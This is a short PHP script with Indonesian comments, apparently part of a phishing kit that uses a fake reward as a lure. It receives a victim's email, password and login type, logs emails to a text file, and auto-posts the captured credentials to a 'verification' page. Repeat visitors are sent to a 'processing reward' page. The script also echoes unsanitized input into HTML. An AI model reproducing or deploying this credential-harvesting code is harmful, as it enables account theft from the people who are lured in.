<?php
//MENERIMA DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

//MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}else{

//MEMERIKSA EMAIL YANG SUDAH LOGIN. JIKA EMAIL YANG DIGUNAKAN SAMA DENGAN YANG SEBELUMNYA, MAKA DIALIHKAN KE HALAMAN PROCESSING_REWARD.PHP (PROSES MENUNGGU HADIAH)
$file_lines = file('system/checkLogin.txt');
foreach ($file_lines as $file => $value) {
$data = explode("|", $value);
if (in_array($email, $data)) {
echo "<form id='arpantek_processing' method='POST' action='completed.php'>
<input type='hidden' name='email' value='$email'>
</form>
<script type='text/javascript'>document.getElementById('arpantek_processing').submit();</script>";
} else {
$myfile = fopen("system/checkLogin.txt", "a") or die("Unable to open file!");
$txt = $email;
if(fwrite($myfile, "|". $txt)) {

//MENERIMA DATA YANG DI-INPUT LALU DIALIHKAN KE HALAMAN VERIFIKASI AKUN
echo "<form id='arpantek_verification' method='POST' action='verification.php'>
<input type='hidden' name='email' value='$email'>
<input type='hidden' name='password' value='$password'>
<input type='hidden' name='login' value='$login'>
</form>
<script type='text/javascript'>document.getElementById('arpantek_verification').submit();</script>";
}
}
}
}
?>